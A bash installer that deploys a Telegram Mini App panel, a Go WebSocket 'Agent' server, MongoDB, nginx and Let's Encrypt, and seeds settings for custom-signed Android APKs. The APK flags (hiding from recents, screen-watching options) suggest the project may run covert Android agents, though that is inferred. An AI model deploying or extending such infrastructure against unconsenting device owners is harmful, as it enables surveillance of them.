#!/usr/bin/env bash
# Base / SecSystem — Ubuntu production installer
# Run as root on Ubuntu 22.04/24.04:
#   sudo bash deploy/ubuntu/setup.sh
#
# Asks for domain + secrets, installs MongoDB/Go/Node/nginx/SSL,
# builds realtime + panel, enables systemd, sets Telegram webhook.
set -euo pipefail

if [[ "${EUID}" -ne 0 ]]; then
  echo "Run as root: sudo bash deploy/ubuntu/setup.sh" >&2
  exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"
APP_ROOT="${APP_ROOT:-/opt/base}"
GO_VERSION="${GO_VERSION:-1.25.0}"
NODE_MAJOR="${NODE_MAJOR:-20}"

echo "=== Base Ubuntu setup ==="
echo "Repo: ${REPO_ROOT}"
echo "Install to: ${APP_ROOT}"
echo

# curl|bash pipes stdin — always read prompts from the real terminal.
ask() {
  local prompt="$1" var="$2" reply=""
  if [[ -r /dev/tty ]]; then
    read -r -p "${prompt}" reply </dev/tty || true
  else
    read -r -p "${prompt}" reply || true
  fi
  printf -v "${var}" '%s' "${reply}"
}

ask "Domain for Mini App (e.g. panel.example.com): " DOMAIN
DOMAIN="$(echo "${DOMAIN}" | tr -d '[:space:]' | sed 's#^https\?://##; s#/.*##')"
if [[ -z "${DOMAIN}" ]]; then
  echo "Domain is required. Re-run: sudo bash /opt/base/deploy/ubuntu/setup.sh" >&2
  exit 1
fi

ask "Email for Let's Encrypt (SSL): " CERT_EMAIL
CERT_EMAIL="$(echo "${CERT_EMAIL}" | tr -d '[:space:]')"
if [[ -z "${CERT_EMAIL}" ]]; then
  echo "Email is required for certbot." >&2
  exit 1
fi

ask "TELEGRAM_BOT_TOKEN: " TELEGRAM_BOT_TOKEN
TELEGRAM_BOT_TOKEN="$(echo "${TELEGRAM_BOT_TOKEN}" | tr -d '[:space:]')"
if [[ -z "${TELEGRAM_BOT_TOKEN}" ]]; then
  echo "Bot token is required." >&2
  exit 1
fi

ask "ADMIN_TELEGRAM_ID (comma-separated ok): " ADMIN_TELEGRAM_ID
ADMIN_TELEGRAM_ID="$(echo "${ADMIN_TELEGRAM_ID}" | tr -d '[:space:]')"
if [[ -z "${ADMIN_TELEGRAM_ID}" ]]; then
  echo "ADMIN_TELEGRAM_ID is required." >&2
  exit 1
fi

ask "REALTIME_FRAME_KEY (32-byte AES, base64/hex; Enter to generate): " REALTIME_FRAME_KEY
REALTIME_FRAME_KEY="$(echo "${REALTIME_FRAME_KEY}" | tr -d '[:space:]')"
if [[ -z "${REALTIME_FRAME_KEY}" ]]; then
  REALTIME_FRAME_KEY="$(openssl rand -base64 32)"
  echo "Generated REALTIME_FRAME_KEY=${REALTIME_FRAME_KEY}"
fi

REALTIME_ADMIN_TOKEN="$(openssl rand -hex 24)"
PUBLIC_URL="https://${DOMAIN}"
WS_URL="wss://${DOMAIN}/v1/ws"

echo
echo "Will use:"
echo "  Mini App: ${PUBLIC_URL}"
echo "  Agent WS: ${WS_URL}"
echo "  Admin token: (generated)"
ask "Continue? [y/N] " OK
[[ "${OK}" =~ ^[Yy]$ ]] || exit 1

export DEBIAN_FRONTEND=noninteractive

echo "==> Packages"
apt-get update -y
apt-get install -y \
  ca-certificates curl gnupg software-properties-common rsync \
  build-essential git nginx certbot python3-certbot-nginx \
  openjdk-17-jre-headless openssl ufw

# MongoDB 7
if ! command -v mongod >/dev/null 2>&1; then
  echo "==> MongoDB"
  . /etc/os-release
  curl -fsSL https://www.mongodb.org/static/pgp/server-7.0.asc \
    | gpg -o /usr/share/keyrings/mongodb-server-7.0.gpg --dearmor
  echo "deb [ arch=amd64,arm64 signed-by=/usr/share/keyrings/mongodb-server-7.0.gpg ] https://repo.mongodb.org/apt/ubuntu ${VERSION_CODENAME}/mongodb-org/7.0 multiverse" \
    > /etc/apt/sources.list.d/mongodb-org-7.0.list
  apt-get update -y
  apt-get install -y mongodb-org
  systemctl enable --now mongod
else
  systemctl enable --now mongod || true
fi

# Go
if ! command -v go >/dev/null 2>&1 || [[ "$(go env GOVERSION 2>/dev/null || true)" != "go${GO_VERSION}"* ]]; then
  echo "==> Go ${GO_VERSION}"
  ARCH="$(uname -m)"
  case "${ARCH}" in
    x86_64) GO_ARCH=amd64 ;;
    aarch64|arm64) GO_ARCH=arm64 ;;
    *) echo "Unsupported arch: ${ARCH}" >&2; exit 1 ;;
  esac
  curl -fsSL "https://go.dev/dl/go${GO_VERSION}.linux-${GO_ARCH}.tar.gz" -o /tmp/go.tgz
  rm -rf /usr/local/go
  tar -C /usr/local -xzf /tmp/go.tgz
  ln -sfn /usr/local/go/bin/go /usr/local/bin/go
  ln -sfn /usr/local/go/bin/gofmt /usr/local/bin/gofmt
fi

# Node.js
if ! command -v node >/dev/null 2>&1 || [[ "$(node -v | sed 's/^v//' | cut -d. -f1)" -lt "${NODE_MAJOR}" ]]; then
  echo "==> Node.js ${NODE_MAJOR}"
  curl -fsSL "https://deb.nodesource.com/setup_${NODE_MAJOR}.x" | bash -
  apt-get install -y nodejs
fi

echo "==> App user + sync code to ${APP_ROOT}"
id -u base >/dev/null 2>&1 || useradd --system --home "${APP_ROOT}" --shell /usr/sbin/nologin base
mkdir -p "${APP_ROOT}"
REPO_REAL="$(realpath "${REPO_ROOT}")"
APP_REAL="$(realpath "${APP_ROOT}")"
if [[ "${REPO_REAL}" != "${APP_REAL}" ]]; then
  rsync -a --delete \
    --exclude '.git' \
    --exclude 'node_modules' \
    --exclude '.next' \
    --exclude 'android' \
    --exclude 'panel.rar' \
    --exclude 'key' \
    --exclude '.cursor' \
    --exclude 'server/realtime' \
    --exclude 'server/realtime.exe' \
    --exclude 'tools/apksigner/work' \
    --exclude 'panel/tools' \
    "${REPO_ROOT}/" "${APP_ROOT}/"
else
  echo "Repo already at ${APP_ROOT} — skip rsync"
fi

mkdir -p "${APP_ROOT}/server" "${APP_ROOT}/panel" "${APP_ROOT}/tools/apksigner/base"
chown -R base:base "${APP_ROOT}"

echo "==> Build realtime"
sudo -u base bash -lc "cd '${APP_ROOT}/server' && /usr/local/go/bin/go build -o realtime ./cmd/realtime"

echo "==> Build panel"
sudo -u base bash -lc "cd '${APP_ROOT}/panel' && npm ci && npm run build"

echo "==> Env files"
cat > "${APP_ROOT}/server/.env" <<EOF
REALTIME_ADDR=127.0.0.1:8080
REALTIME_MONGO_URI=mongodb://127.0.0.1:27017
REALTIME_MONGO_DB=realtime
REALTIME_TOKEN=
REALTIME_ADMIN_TOKEN=${REALTIME_ADMIN_TOKEN}
REALTIME_FRAME_KEY=${REALTIME_FRAME_KEY}
TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
REALTIME_TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
REALTIME_AI_URL=
EOF
chmod 640 "${APP_ROOT}/server/.env"
chown base:base "${APP_ROOT}/server/.env"

# Preserve existing APK base settings if present; else seed defaults
SETTINGS_JSON="${APP_ROOT}/tools/apksigner/base/settings.json"
if [[ ! -f "${SETTINGS_JSON}" ]]; then
  cat > "${SETTINGS_JSON}" <<EOF
{
  "serverUrl": "${WS_URL}",
  "token": "",
  "frameKey": "${REALTIME_FRAME_KEY}",
  "autoGrantUseAi": false,
  "watchMarkEye": false,
  "watchDumpFab": false,
  "clearRecents": true,
  "versionName": "1.0.0",
  "versionCode": 1
}
EOF
  chown base:base "${SETTINGS_JSON}"
fi

cat > "${APP_ROOT}/panel/.env" <<EOF
TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
ADMIN_TELEGRAM_ID=${ADMIN_TELEGRAM_ID}
TELEGRAM_MINI_APP_URL=${PUBLIC_URL}
REALTIME_API_URL=http://127.0.0.1:8080
REALTIME_ADMIN_TOKEN=${REALTIME_ADMIN_TOKEN}
APK_SIGNER_DIR=${APP_ROOT}/tools/apksigner
JAVA_BIN=/usr/bin/java
NODE_ENV=production
EOF
chmod 640 "${APP_ROOT}/panel/.env"
chown base:base "${APP_ROOT}/panel/.env"

echo "==> systemd"
install -m 644 "${SCRIPT_DIR}/base-realtime.service" /etc/systemd/system/base-realtime.service
install -m 644 "${SCRIPT_DIR}/base-panel.service" /etc/systemd/system/base-panel.service
# Point units at APP_ROOT if customized
sed -i "s|/opt/base|${APP_ROOT}|g" /etc/systemd/system/base-realtime.service /etc/systemd/system/base-panel.service
systemctl daemon-reload
systemctl enable base-realtime base-panel
systemctl restart base-realtime
sleep 1
systemctl restart base-panel

echo "==> nginx"
mkdir -p /etc/nginx/snippets
cat > /etc/nginx/snippets/base-upgrade-map.conf <<'EOF'
map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
}
EOF
grep -q 'base-upgrade-map' /etc/nginx/nginx.conf \
  || sed -i '/http {/a\    include /etc/nginx/snippets/base-upgrade-map.conf;' /etc/nginx/nginx.conf

# HTTP-only first for certbot
cat > /etc/nginx/sites-available/base <<EOF
server {
    listen 80;
    listen [::]:80;
    server_name ${DOMAIN};

    location /.well-known/acme-challenge/ {
        root /var/www/html;
    }

    location /v1/ {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection \$connection_upgrade;
        proxy_read_timeout 3600s;
    }

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection \$connection_upgrade;
        client_max_body_size 80m;
    }
}
EOF
ln -sfn /etc/nginx/sites-available/base /etc/nginx/sites-enabled/base
rm -f /etc/nginx/sites-enabled/default
nginx -t
systemctl reload nginx

echo "==> Firewall (22/80/443)"
ufw allow OpenSSH >/dev/null 2>&1 || true
ufw allow 80/tcp >/dev/null 2>&1 || true
ufw allow 443/tcp >/dev/null 2>&1 || true
ufw --force enable >/dev/null 2>&1 || true

echo "==> SSL (Let's Encrypt)"
certbot --nginx -d "${DOMAIN}" \
  --non-interactive --agree-tos -m "${CERT_EMAIL}" \
  --redirect || {
  echo "certbot failed — check DNS A/AAAA for ${DOMAIN} points to this server." >&2
  exit 1
}

# Ensure full SSL site with WS timeouts (certbot may rewrite; re-apply extras)
if [[ -f /etc/letsencrypt/live/${DOMAIN}/fullchain.pem ]]; then
  sed "s/__DOMAIN__/${DOMAIN}/g" "${SCRIPT_DIR}/nginx.conf.template" \
    > /etc/nginx/sites-available/base
  # certbot options may already exist
  nginx -t && systemctl reload nginx
fi

echo "==> Telegram webhook + menu button"
WEBHOOK_URL="${PUBLIC_URL}/api/bot"
curl -fsS "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook" \
  -d "url=${WEBHOOK_URL}" \
  -d "allowed_updates=[\"message\",\"callback_query\"]" >/dev/null || true
curl -fsS "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setChatMenuButton" \
  -H 'Content-Type: application/json' \
  -d "{\"menu_button\":{\"type\":\"web_app\",\"text\":\"پنل\",\"web_app\":{\"url\":\"${PUBLIC_URL}\"}}}" >/dev/null || true

systemctl restart base-realtime base-panel

cat > "${APP_ROOT}/deploy-info.txt" <<EOF
domain=${DOMAIN}
public_url=${PUBLIC_URL}
ws_url=${WS_URL}
frame_key=${REALTIME_FRAME_KEY}
admin_token=${REALTIME_ADMIN_TOKEN}
installed_at=$(date -Is)
EOF
chmod 600 "${APP_ROOT}/deploy-info.txt"
chown root:root "${APP_ROOT}/deploy-info.txt"

echo
echo "=== Done ==="
echo "Mini App:  ${PUBLIC_URL}"
echo "Agent WS:  ${WS_URL}"
echo "Webhook:   ${WEBHOOK_URL}"
echo "Services:  systemctl status base-realtime base-panel"
echo "Logs:      journalctl -u base-realtime -u base-panel -f"
echo
echo "BotFather → set Mini App / Web App URL to: ${PUBLIC_URL}"
echo "APK پایه → serverUrl را ${WS_URL} بگذار (اسکریپت seed کرده اگر خالی بود)."
echo "Secrets also in ${APP_ROOT}/deploy-info.txt (root only)."
